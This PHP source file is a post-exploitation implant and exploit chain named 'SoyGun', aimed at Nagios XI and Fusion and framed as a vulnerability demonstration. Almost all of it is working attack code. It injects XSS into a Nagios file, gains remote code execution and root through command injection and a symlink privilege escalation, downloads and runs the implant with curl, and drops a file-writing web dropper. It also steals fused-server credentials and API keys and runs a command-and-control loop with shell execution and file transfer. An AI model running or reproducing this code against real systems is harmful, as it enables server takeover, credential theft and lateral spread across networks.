<?php
/****************************************************************************************************/
/*************************************** SOYGUN IMPLANT *********************************************/
/****************************************************************************************************/
/* SoyGun - The Nagios XI / Fusion post-exploitation tool.
 *
 * AUTHOR: Samir Ghanem
 * COMPANY: Skylight Cyber Security Pty. Ltd.
 * DATE: Jan 2021
 * 
 * WARNING: Running this can damage a Nagios Deployment - Use at own risk.
 * DISCLAIMER: This is just a demonstration on how we can string together a few vulnerabilities
 *      to take full control of a Nagios XI / Fusion deployment given Nagios account access.
 * 
 * COPYRIGHT: 
 * 
 * OVERVIEW:
 * The SoyGun implant is intended to be used with the SoyGun CLI (soygun-cli.php). Using the CLI you can
 * deploy, exploit, and control the Nagios server fleet.
 * 
 * SECTIONS:
 *  - DeadDrop Code
 *  - DeadDrop Library Code
 *  - XSS Payload Code
 *  - SoyGun Implant Code
 *  - Fusion Exploit Code
 *  - XI Exploit Code
 */

// Supported Nagios Versions
define("BASE_NAGIOSXI_DIR", "/usr/local/nagiosxi");
define("BASE_NAGIOSFUSION_DIR", "/usr/local/nagiosfusion");

$xiversion = "5.7.3";
$xiversion_file = BASE_NAGIOSXI_DIR . "/var/xiversion";
$fusionversion = "4.1.8";
$fusionversion_file = BASE_NAGIOSFUSION_DIR . "/var/fusionversion";

$config = array(
    "cli_ip" => "",
    "self_ip" => ""
);

/************ Self IP & Implant Mode are needed for DeadDrop, Payload & Implant ******/

// Get Self IP - Using shell command since PHP may return 127.0.0.1 which won't work.
$config["self_ip"] = exec("ip a | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'");

// Check Nagios XI/Fusion Version & Get Implant Mode
$mode = "";
function get_nagios_version($version_file) {
    $content = file_get_contents($version_file);
    preg_match_all('/full=(?<Version>.+)\r?\n/', $content, $matches);
    $version = $matches["Version"][0];
    return $version;
}
if(file_exists($xiversion_file)) {
    $mode = "xi";
    $version = get_nagios_version($xiversion_file);
    if($version != $xiversion) {
        die;
    }
}
elseif (file_exists($fusionversion_file)) {
    $mode = "fusion";
    $version = get_nagios_version($fusionversion_file);
    if($version != $fusionversion) {
        die;
    }
}
else {
    $mode = "cli";
}

// Define some URLs
$baseurl = "http://{$config["self_ip"]}/nagios{$mode}/";
$self_implant_url = $baseurl . "includes/implant.php";
$payload_url = $self_implant_url . "?payload";
$deaddrop_url = $self_implant_url . "?deaddrop";

// Define some paths
$nagiosrootdir = "/usr/local/nagios{$mode}/";
$tmp_dir = $nagiosrootdir . "tmp/";
$webroot = $nagiosrootdir . "html/";
$deaddrop_pbdir = $tmp_dir;
$root_dir = $webroot . "includes/";
$implant_path = $root_dir . "implant.php";
define("XI_DROPPER_PATH", BASE_NAGIOSXI_DIR . "/html/includes/dropper.php");

/****************************************************************************************************/
/*************************************** DEADDROP CODE **********************************************/
/****************************************************************************************************/

if(isset($_GET['deaddrop'])) {
    if(isset($_POST["pickup"])) {
        $sDestinations = $_POST["pickup"];
        $destinations = unserialize($sDestinations);
        $files = array();
        foreach($destinations as $destination) {
            $files = array_merge($files, glob("{$deaddrop_pbdir}/{$destination}.*"));
        }
        $contents = array();
        foreach($files as $file)
        {
            $contents[] = file_get_contents($file);
            unlink($file);
        }
        $output = serialize($contents);
        print_r($output);
    }
    elseif(isset($_POST["drop"])) {
        $sFiles = $_POST["drop"];
        $aFiles = unserialize($sFiles);
        $count = 0;
        foreach($aFiles as $File) {
            $count++;
            file_put_contents("{$deaddrop_pbdir}/{$File["dest"]}.{$File["id"]}", serialize($File));
        }
    }
    die;
}

/****************************************************************************************************/
/************************************ DEADDROP LIBRARY CODE *****************************************/
/****************************************************************************************************/

// Pickup DeadDrop messages from local ParkBench directory
function dd_pickup_local($deaddrop_path, $destinations) {
    $files = array();
    foreach($destinations as $destination) {
        $files = array_merge($files, glob("{$deaddrop_path}/{$destination}.*"));
    }
    $contents = array();
    foreach($files as $file)
    {
        $contents[] = file_get_contents($file);
        unlink($file);
    }
    return $contents;
}

// Drop DeadDrop messages in local ParkBench directory
function dd_drop_local($deaddrop_path, $messages) {
    $count = 0;
    foreach($messages as $message) {
        $count++;
        file_put_contents("{$deaddrop_path}/{$message["dest"]}.{$message["id"]}", serialize($message));
    }
}

// Send / Recieve DeadDrop Messages to/from a DeadDrop URL
function dd_send_recv($deaddrop_url, $action, $data) {
    $sResult = "";
    $content = array($action => "{$data}");
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($content),
			'timeout' => 10,
        )
    );
    $context  = stream_context_create($options);
    set_error_handler(function() { /* ignore errors */ });
    $sResult = file_get_contents($deaddrop_url, false, $context);
    restore_error_handler();
    if($sResult == "") {
        return array();
    }
    $result = unserialize($sResult);
    return $result;
}

// Adds a message to a group of messages
function dd_add($Src, $Dest, $Data) {
    return array(
        "id" => uniqid(),
        "src" => $Src,
        "dest" => $Dest,
        "ttl" => 13, // TTL of 13 because 13 is lucky
        "data" => $Data
    );
}

// Pick up messages from DeadDrop location
function dd_pickup($deaddrop_url, $Dests) {
    $sDests = serialize($Dests);
    $Messages = dd_send_recv($deaddrop_url, "pickup", $sDests);
    return $Messages;
}

// Drop messages at DeadDrop location
function dd_drop($deaddrop_url, $Messages) {
    $sMessages = serialize($Messages);
    $result = dd_send_recv($deaddrop_url, "drop", "{$sMessages}");
    return $result;
}

/****************************************************************************************************/
/************************************ FUSION XSS EXPLOIT CODE ***************************************/
/****************************************************************************************************/

function xi_exploit_fusion($arm) {
    global $webroot;
    global $payload_url;
    global $payload_code_b64;
    global $config;

    /* We manipulate Nagios files, want to make sure they are as expected and we don't break anything
     * other version might have different MD5 sums so these can be updated or YOLO and remove the
     * check.
     */
    $utils_xmlstatus_origmd5 = "e72d4a5e3b81c15494988b9a5f3e1e17";
    $utils_xmlstatus_path = $webroot . "includes/utils-xmlstatus.inc.php";
    $utils_xmlstatus_newline = <<<STR
                \\\$output .= "  <status_text><![CDATA[<script src=\\x27{$payload_url}\\x27></script>]]></status_text>"\;\\n
STR;
    $utils_xmlstatus_origline = <<<STR
                \\\$output .= get_xml_db_field(2, \\\$rs, \\x27output\\x27, \\x27status_text\\x27)\;\\n
STR;

    if($arm) {
        // Arm by adding malicious line to utils-xmlstatus.inc.php
        $xmlstatus_md5 = md5_file($utils_xmlstatus_path);
        if ($xmlstatus_md5 == $utils_xmlstatus_origmd5) {
            print("M5SUM Verified\nArming SoyGun... ");
            shell_exec("sed -i '970d' {$utils_xmlstatus_path} && sed -i '970s;^;{$utils_xmlstatus_newline};' {$utils_xmlstatus_path}");
            print("Armed! Pew! Pew!\n");
        } elseif ($xmlstatus_md5 == $utils_xmlstatus_modmd5) {
            print("WARN: Seems like SoyGun has already been deployed.");
            return "FAIL_AlreadyArmed";
        } else {
            print("ERROR: utils-xmlstatus.inc.php does not match MD5\n");
            return "FAIL_MD5Mismatch";
        }
    } else {
        // Unarm by removing malicious line from utils-xmlstatus.inc.php
        print("Unarming SoyGun... ");
        $content = file_get_contents($utils_xmlstatus_path);
        $content = explode("\n", $content);
        $matches = preg_grep("/CDATA/", $content);
        if (count($matches) == 1) {
            shell_exec("sed -i '970d' {$utils_xmlstatus_path} && sed -i '970s;^;{$utils_xmlstatus_origline};' {$utils_xmlstatus_path}");
            print("Unarmed!\n");
        } else {
            print("Oops! Already unarmed.\n");
            return "FAIL_AlreadyUnarmed";
        }
    }
    return "SUCCESS";
}

/****************************************************************************************************/
/************************************* XSS PAYLOAD CODE *********************************************/
/****************************************************************************************************/

if(isset($_GET['payload'])) {
    header("content-type: application/x-javascript");
    $stage = 0;
    $template = "";
    $stage = $_GET['payload'];

    if($stage == 0)
    {
        /** STAGE 0
         * This exploits CVE-2020-YYYY
         * by using the ajaxhelper.php paged_table command to execute arbitrary code 
         */
        $template = <<<STR
            return a();
            function a()
            {
            	\$code = file_get_contents("{$payload_url}=1");
            	eval(\$code);
            }
STR;

        $data = array("s" => "SELECT * FROM users limit 1",
            "b" => "",
            "o" => array("columns" => array("username" => array("eval"=> $template)))
        );
        $payload = base64_encode(serialize($data));
        $code = <<<STR
function deploy() {
    var url = "../ajaxhelper.php";
    var params = 'cmd=paged_table&opts={"which":"first","table_data":"<?=$payload?>}"}';
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.withCredentials = true;
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=UTF-8\\r\\n");
    xhr.send(params);
}
deploy();
STR;
        print($code);
    }
    elseif($stage == 1)
    {
        /** STAGE 1 
         * This exploits CVE-2020-YYYY
         * From the Nagios Fusion context we can run DB queries and insert rows.
         * We insert a row into the command table that abuses a command injection vulnerability.
         * The command injected does the following:
         *  - Inserts the malicious 'root_cmd' command string into the second line of change_timezone.sh
         *  - Executes 'change_timezone.sh' as root
         *  - Removes the malicious line from 'change_timezeon.sh'
         */
        $fusion_implant_path = BASE_NAGIOSFUSION_DIR . "/html/includes/implant.php";
        $root_cmd = "curl -o {$fusion_implant_path} {$payload_url}=2\\\\; php {$fusion_implant_path} {$config["self_ip"]}";

        $sql_insert = "INSERT INTO commands (command,command_data) VALUES (100,\"XXX'; ";
        $sql_insert .= "sed -i '2s;^;{$root_cmd}\\\\n;' ".BASE_NAGIOSFUSION_DIR."/scripts/change_timezone.sh; ";
        $sql_insert .= "sudo ".BASE_NAGIOSFUSION_DIR."/scripts/change_timezone.sh -z 'XXX'; ";
        $sql_insert .= "sed -i '2d' ".BASE_NAGIOSFUSION_DIR."/scripts/change_timezone.sh #\")";
        $sql_insert_b64 = base64_encode($sql_insert);

        $code = <<<STR
return b();
function b()
{
    global \$db;
    \$sql_cmd = base64_decode('{$sql_insert_b64}');
    \$ret = \$db->exec_query(\$sql_cmd);
    if(\$ret) {
        print("INSERTED:{\$ret}\\n");
    } else {
        print("FAIL");
    }
}
STR;
        print($code);
    }
    elseif($stage == 2)
    {
		// STAGE 2 - The actual code that will run as root on the target Nagios Fusion or XI
		$implant_code = file_get_contents(__FILE__);
        print($implant_code);
    }
    // Always die at the end of 'payload' code
    die;
}

/****************************************************************************************************/
/************************************* XI SERVER EXPLOIT CODE ***************************************/
/****************************************************************************************************/

function exploit_xi($xi) {
    global $config;
    global $implant_path;
    global $tmp_dir;

    $nsp = "";

    print("Exploiting XI @ {$xi['url']}.\n");
    $login_url = $xi['url'] . "/login.php";

    // Initialize cURL
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_TIMEOUT, 60);
    curl_setopt($curl, CURLOPT_COOKIESESSION, true);
    curl_setopt($curl, CURLOPT_COOKIEJAR, $tmp_dir . 'implantxi.cookie');
    curl_setopt($curl, CURLOPT_COOKIEFILE, $tmp_dir . 'implantxi.cookie');

    // Get login.php to get NSP
    // TODO: Validate that it's an XI or nah?
    print("Getting NSP from {$login_url}... ");
    curl_setopt($curl, CURLOPT_URL, $login_url);
    $resp = curl_exec($curl);
    preg_match_all('/var nsp_str = "(?<NSP>.+)";/', $resp, $matches);
    if(count($matches["NSP"]) > 0) {
        $nsp = $matches["NSP"][0];
    } else {
        print("ERROR: Failed get NSP from login page.\n");
        return $xi;
    }
    unset($resp);
    print("OK.\n");

    // Login - this returns a 302, that we follow and get the new NSP
    print("Logging in with {$xi['username']}/{$xi['password']}... ");
    $login_params = array(
        "nsp" => $nsp,
        "page" => "auth",
        "debug" => "",
        "pageopt" => "login",
        "username" => $xi['username'],
        "password" => $xi['password'],
        "loginButton" => ""
    );
    curl_setopt($curl, CURLOPT_URL, $login_url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $login_params);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $resp = curl_exec($curl);
    // Get NSP from response
    preg_match_all('/var nsp_str = "(?<NSP>.+)";/', $resp, $matches);
    if(count($matches["NSP"]) > 0) {
        $nsp = $matches["NSP"][0];
    } else {
        print("ERROR: Failed to login.\n");
        print("{$resp}\n");
        return $xi;
    }
    print("OK.\n");

    /* Exploit Nagios XI */
    print("Deploying dropper...  ");
    // Step 1: Use RCE + Priv Esc to deploy dropper in html/includes to drop the implant
    // Contents of the file dropper PHP script to be deployed in the webroot.
    // Unfortunately the webroot isn't writable by 'apache' user so we have to use the
    // priv esc to drop this file... T.T
    $dropper_code = "<?php file_put_contents(\\\$_POST[\\\"f\\\"], base64_decode(\\\$_POST[\\\"d\\\"]));";
    // Code to run as root
    $run_as_root = "echo \"{$dropper_code}\" > " . XI_DROPPER_PATH;
    $resp = xi_rce_and_privesc($curl, $xi, $nsp, $run_as_root);
	if(!$resp)
	{
		print("Error occured.");
		return;
	}
    print("OK.\n");

    // Step 2: Use send dropper implant.php
    print("Deploying implant to temp dir... ");
    $xi_implant_path = BASE_NAGIOSXI_DIR . "/tmp/implant.php";
	$params = array(
        "f" => $xi_implant_path,
		"d" => base64_encode(file_get_contents(__FILE__))
    );
	
    curl_setopt($curl, CURLOPT_URL, $xi['url'] . "/includes/dropper.php");
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($params));
    $resp = curl_exec($curl);
	if(curl_getinfo($curl, CURLINFO_HTTP_CODE) != "200")
	{
		print("Error occured: " . curl_error($curl) . "\n");
		return;
	}
    print("OK.\n");

    // Step 2: Use RCE + Priv Esc to launch implant.php
    print("Launching implant... ");
    $run_as_root = "mv ".BASE_NAGIOSXI_DIR."/tmp/implant.php ".BASE_NAGIOSXI_DIR."/html/includes/; php ".BASE_NAGIOSXI_DIR."/html/includes/implant.php {$config["self_ip"]} &";
    $resp = xi_rce_and_privesc($curl, $xi, $nsp, $run_as_root);
	// ignore return value.
    print("OK.\n");

    // Mark XI as exploited
    $xi['exploited'] = TRUE;
    curl_close($curl);
    print("DONE!\n");
    return $xi;
}

function xi_rce_and_privesc($curl, $xi, $nsp, $run_as_root) {
	$profile_name = "evil";
    $phpmailer_temp = BASE_NAGIOSXI_DIR . "/tmp/phpmailer.log";
    $evil_profile = BASE_NAGIOSXI_DIR . "/var/components/profile/$profile_name";
    $repair_db_script = BASE_NAGIOSXI_DIR . "/scripts/repair_databases.sh";
	$base_nagiosxi_dir = BASE_NAGIOSXI_DIR;
    // Priv Esc Bash
    $xi_privesc_sh = <<<STR
mkdir -p "{$evil_profile}"
ln -fs "{$repair_db_script}" "{$evil_profile}/phpmailer.log"
sudo "{$base_nagiosxi_dir}/scripts/components/getprofile.sh" "$profile_name"
sudo "{$repair_db_script}" &
STR;
    $xi_privesc_sh = "echo '{$run_as_root}' > {$phpmailer_temp}\n" . $xi_privesc_sh;
    $xi_privesc_b64 = base64_encode($xi_privesc_sh);
    // Low Privileges RCE: This will be executed as apache user
    $rce = "echo {$xi_privesc_b64}|base64 -d|tee /tmp/soygun.sh;/bin/bash /tmp/soygun.sh &";
    $rce = urlencode($rce);
    // Build the exploit URL
    $exploit_url = $xi['url'] . "/includes/components/autodiscovery/?mode=newjob&update=1&job=`{$rce}`&nsp={$nsp}&address=192.168.1.0/24&frequency=Daily&hour=09&minute=00&ampm=AM&dayofweek=1&dayofmonth=1&os_detection=on&system_dns=off&topology_detection=on";
    curl_setopt($curl, CURLOPT_URL, $exploit_url);
    curl_setopt($curl, CURLOPT_POST, false);
    curl_setopt($curl, CURLOPT_POSTFIELDS, false);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, false);
    $resp = curl_exec($curl);
    return strpos($resp, "CRON TIMES") !== FALSE;
}

/****************************************************************************************************/
/************************************ SOYGUN IMPLANT CODE *******************************************/
/****************************************************************************************************/

if($mode == "xi" or $mode == "fusion") {


    // Return list of Fused servers - only in Fusion mode
    if(isset($_GET['servers']) and $mode == "fusion") {
        include("base.inc.php"); // This can only be included in an Authenticated session
        print_r(serialize(get_servers()));
        die;
    }

    // Need to have the callback IP address passed as the first argument
    if(count($argv) != 2) {
        print("ERROR: Bad Args - needs callback IP.\n");
        die;
    }

    $callback_ip = $argv[1];

    $xis = array(); // Stores all the known XIs when running in Fusion mode
    $callback_deaddrop = "";

    /***** Beacon to back to DeadDrop that deployed script *****/
    $mode_upper = strtoupper($mode);
    // Set beacon DeadDrop location (either self for XI or callback for Fusion)
    $Messages = array();
    if($mode == "xi") {
        $Messages[] = dd_add($config["self_ip"], $callback_ip, "BEACON:{$mode_upper}");
        $res = dd_drop_local($deaddrop_pbdir, $Messages);
    }
    elseif ($mode == "fusion") {
        print("Default XI: {$callback_ip}\n");
        $callback_deaddrop = "http://{$callback_ip}/nagiosxi/includes/implant.php?deaddrop";
        $Messages[] = dd_add($config["self_ip"], $callback_ip, "BEACON:{$mode_upper}");
        $res = dd_drop($callback_deaddrop, $Messages);
    }

    /******** Get Nagios config *******/
    require_once($webroot . "config.inc.php");
    $nagios_cfg = $cfg;

    /******** Get fused server details ********
     * To get fused server details we need to have an authenticated session... we can use a user's API
     * key to authenticate and get a cookie and then make a GET request to our implant which will return
     * the array of fused servers and the decrypted password.
     * If someone wants to figure out the decryption key that would avoid us doing this. (It's probably
     * 'nagiosfusion' or something like that...)
     */
    if($mode == "fusion") {
        /******** Establish Database Connection *******/
        print("Connecting to {$mode} DB... ");
        $db_link = mysql_connect(
            $nagios_cfg['database'][$mode]['host'],
            $nagios_cfg['database'][$mode]['user'],
            $nagios_cfg['database'][$mode]['pass']
        );
        if(!$db_link) {
            die('Could not connect:' . mysql_error());
        }
        $ret = mysql_select_db($nagios_cfg['database'][$mode]['dbname'], $db_link);
        if(!$ret) {
            die("Could not select DB.\n");
        }
        print("OK.\n");

        /******** Get fused server details ********/
        print("Getting Nagios users from DB... ");
        $users = array();
        $query = "SELECT * FROM users";
        $query_result = mysql_query($query, $db_link);
        for($count = mysql_num_rows($query_result); $count > 0; $count--) {
            $users[] = mysql_fetch_assoc($query_result);
        }
        print("OK.\n");

        print("Getting fused server details... ");
        $servers = array();
        foreach($users as $user) {
            // Needs to be a user with API enabled and an API Key set
            if($user['api_enabled'] and $user['api_key']) {
                $curl = curl_init();
				curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
                curl_setopt( $curl, CURLOPT_COOKIESESSION, true);
                curl_setopt( $curl, CURLOPT_COOKIEJAR, 'tmp/implant.cookie');
                curl_setopt( $curl, CURLOPT_COOKIEFILE, 'tmp/implant.cookie');
                curl_setopt($curl, CURLOPT_URL, $baseurl . 'api/v1/?apikey=' . $user['api_key']);
                $resp = curl_exec($curl);
                unset($resp);
                curl_setopt($curl, CURLOPT_URL, $baseurl . 'includes/implant.php?servers');
                $resp = curl_exec($curl);
                $servers = unserialize($resp);
                curl_close($curl);
                break;
            }
        }
        foreach($servers as $xi) {
			$xi_ip = parse_url($xi["url"], PHP_URL_HOST);
            $xi_new = array(
                "type" => "xi",
                "ip" => $xi_ip,
                "url" => $xi["url"],
                "name" => $xi["name"],
                "username" => $xi["username"],
                "password" => $xi["password"],
            );
            // Set the 0th XI to the callback XI
            if($xi_new['ip'] == $callback_ip) {
                $xi_new['exploited'] = TRUE;
                $xi_new["deaddrop"] = "{$xi["url"]}/includes/implant.php?deaddrop";
                array_unshift($xis, $xi_new);
            } else {
                // Append XI details to array
                $xi_new['exploited'] = FALSE;
                $xi_new["deaddrop"] = "";
                $xi_new["parent"] = $config["self_ip"];
                $xis[] = $xi_new;
            }
        }
        $count = count($xis);
        print("OK.\n");
        print(" * {$count} fused servers\n");
        print_r($xis);
        // Send list of fused XI servers back to callback IP
        $messages[] = dd_add($config["self_ip"], $callback_ip, "FUSEDXI:" . serialize($xis));
        dd_drop($callback_deaddrop, $messages);
    }
    elseif($mode == "xi") {
        // Delete the dropper.php file used to deploy the implant
        if(file_exists(XI_DROPPER_PATH)) {
            unlink(XI_DROPPER_PATH);
        }
    }

    print("Mode: {$mode}\n");
    print("Self IP: {$config["self_ip"]}\n");
    print("Callback IP: {$callback_ip}\n");
    print("Callback DeadDrop: {$callback_deaddrop}\n");

    /******************************** SoyGun Implant Main Loop *************************************/

    print("Starting SoyGun {$mode} implant main loop... \xE2\x88\x9E\n"); // Inifity Symbol
    $uninstall = FALSE;
    while($uninstall == FALSE) {

        /****** Get DeadDrop Messages ********/
        $dests = array();
        foreach($xis as $xi) {
            $dests[] = $xi["ip"];
        }
        $dests[] = $config["self_ip"];
        $messages = dd_pickup_local($deaddrop_pbdir, $dests); // Pickup all local messages

        // If Fusion, pickup all messages from exploited XIs
        if($mode == "fusion") {
            $xis_temp = $xis;
            for($i = 0; $i < count($xis); $i++) {
                $dests = array();
                $current_xi = array_shift($xis_temp);
                if($current_xi['exploited']) {
                    foreach($xis_temp as $xi) {
                        $dests[] = $xi["ip"];
                    }
                    $dests[] = $config["self_ip"];
                    if($config["cli_ip"] != "") {
                        $dests[] = $config["cli_ip"];
                    }
                    //print("Picking up messages from {$current_xi["ip"]}. Destined to: \n");
                    //print_r($dests);
                    $messages = array_merge($messages, dd_pickup($current_xi["deaddrop"], $dests));
                }
                // Put processed XI back in list
                $xis_temp[] = $current_xi;
            }
        }

        /****** Process Messages ********/
        $responses = array();
        foreach($messages as $message) {
            $result = "";
            $message = unserialize($message);
            $data = $message["data"];
            $command = explode(":", $data);
            $action = array_shift($command);

            // If message is not destined to self and not Exploit action then forward the message
            if($message["dest"] != $config["self_ip"] and $action != "EXPLOIT") {
                $dd = "";
                if($message["dest"] == $config["cli_ip"]) {
                    $dd = $callback_deaddrop;
                } else {
                    foreach($xis as $xi) {
                        if($xi["ip"] == $message["dest"]) {
                            $dd = $xi["deaddrop"];
                        }
                    }
                }
                if($dd == "") {
                    print("ERROR: Failed to correctly forward message\n");
                    print_r($message);
                } else {
                    print("Forwarding messages to {$dd}\n");
                    $msg = array(dd_add($message["src"], $message["dest"], $message["data"]));
                    dd_drop($dd, $msg);
                }
                continue; // foreach message loop
            }

            /***** Generic commands for both XI and Fusion Actions *****/
            switch($action) {
                // Execute local command
                case "EXEC":
                    print("Recieved exec from {$message["src"]}\n");
                    $cmdline = join(":", $command); // In case ":" is used in any commands
                    $result = shell_exec($cmdline);
                break;
                case "PING":
                    print("Recieved ping from {$message["src"]}\n");
                    $result = "ACK";
                break;
                case "BEACON":
                    $type = array_shift($command);
                    if($type == "FUSION" and $mode == "xi") {
                        print("Recieved Beacon from Fusion @ {$message["src"]}\n");
                        $result = xi_exploit_fusion(0); // Got a BEACON from exploited Fusion so Unarm
                        // Send message to callback
                        $msg_to_callback = "RESP:EXPLOIT:FUSION_Success:{$message["src"]}";
                        $msgs = array(dd_add($config["self_ip"], $callback_ip, $msg_to_callback));
                        dd_drop_local($deaddrop_pbdir, $msgs);
                        unset($msgs);
                    } elseif ($type == "XI") {
                        // Do something else
                        print("Recieved Beacon from XI @ {$message["src"]}\n");
                        $result = "RESPONSE";
                    } else {
                        $result = "ERROR";
                    }
                break;
                case "GET":
                    $src = array_shift($command);
                    $dst = array_shift($command);
                    print("Sending file {$src} to {$message["src"]}\n");
                    $data = base64_encode(file_get_contents($src));
                    $result = "{$src}:{$dst}:{$data}";
                break;
                case "PUT":
                    $path = array_shift($command);
                    $data = base64_decode(array_shift($command));
                    print("Writing file to {$path}\n");
                    file_put_contents($path, $data);
                    $result = "SUCCESS";
                break;
                case "UNINSTALL":
                    if($mode == "fusion") {
                        mysql_close($db_link);
                    }
                    elseif($mode == "xi") {
                        xi_exploit_fusion(0); // Unarm XI if armed
                    }
                    unlink($implant_path);
                    $uninstall = TRUE;
                    $result = "ACK";
                break;
                case "FUSEDXI":
                    print("Fused XI list recieved from {$message["src"]}... forwarding to {$callback_ip}\n");
                    $message["src"] = $callback_ip;
                    $result = join(":", $command);
                break;
				case "ADD_FLAMES":
					switch($mode)
					{
						case "xi":
							$base_dir = BASE_NAGIOSXI_DIR;
							break;
						case "fusion":
							$base_dir = BASE_NAGIOSFUSION_DIR;
							 break;
					}
					if(!file_exists("$base_dir/html/_login.php"))
					{
						rename("$base_dir/html/login.php", "$base_dir/html/_login.php");
						$new_html = <<<STR
								<img src="flames.png">
STR;
						$new_html_b64 = base64_encode($new_html);
						$data = <<<STR
					<?php
					function add_flames_filter_output(\$output)
					{
						\$new_html = base64_decode("$new_html_b64");
						return str_replace("<div class=\"loginsplash\">", "<div>\$new_html", \$output);
					}
					ob_start("add_flames_filter_output");
					require(dirname(__FILE__) . "/_login.php");
STR;
						file_put_contents("$base_dir/html/login.php", $data);
					}
					$result = "SUCCESS";
				break;
            }

            /****** Implant type specific command handling *****/
            if($result == "") { // Only run if we haven't got a response already
                if($mode == "xi") {
                    switch($action) {
                        // Arm Nagios XI to exploit fused Fusions
                        case "ARM":
                            $result = xi_exploit_fusion(1);
                        break;
                        case "UNARM":
                            $result = xi_exploit_fusion(0); // Got a BEACON from an exploited Fusion
                        break;
                    }
                }
                elseif ($mode == "fusion") {
                    switch($action) {
                        case "EXPLOIT":
                            $xi_ip = array_shift($command);
                            print("Recieved command to exploit XI @ {$xi_ip} from {$message["src"]}\n");
                            for($count = 0; $count < count($xis); $count++) {
                                if($xis[$count]["ip"] == $xi_ip and $xis[$count]["exploited"] == FALSE) {
                                    $xis[$count]["exploited"] = TRUE;
                                    // Add the deaddrop URL now that it is exploited
                                    $xis[$count]["deaddrop"] = $xis[$count]["url"] . "/includes/implant.php?deaddrop";
                                    $xis[$count]["parent"] = $config["self_ip"];
                                    exploit_xi($xis[$count]);
                                    $result = "SUCCESS";
                                    break;
                                }
                            }
                        break;
                        case "CLI_IP":
                            $config["cli_ip"] = array_shift($command);
                            print("Notified of CLI @ {$config["cli_ip"]}\n");
                            $result = "ACK";
                        break;
                    }
                }
            }

            // Add result if any...
            if($result != "") {
                $responses[] = dd_add($config["self_ip"], $message["src"], "RESP:" . $action . ":" . $result);
            } else {
                print("WARN: Unhandled message\n");
                print_r($message);
            }
        }

        /****** Fusion & XI Handle Responses Differently & sleep different amounts ******/
        if($mode == "fusion") {
            if(count($responses) > 0) {
                dd_drop($callback_deaddrop, $responses);
            }
            sleep(13); // Since fusion queries HTTP DeadDrops increase the sleep time
        } elseif ($mode == "xi") {
            if(count($responses) > 0) {
                dd_drop_local($deaddrop_pbdir, $responses);
            }
            sleep(3); // Nagios XI does not query any HTTP DeadDrops so can loop at a higher frequency
        }
    } // while(...)

    // NOTE: There is a delay in the uninstall but it's ok since we will want to get the 
    // ACK back from the uninstall plus who cares?
    // Uninstall
    exit(0);
}

?>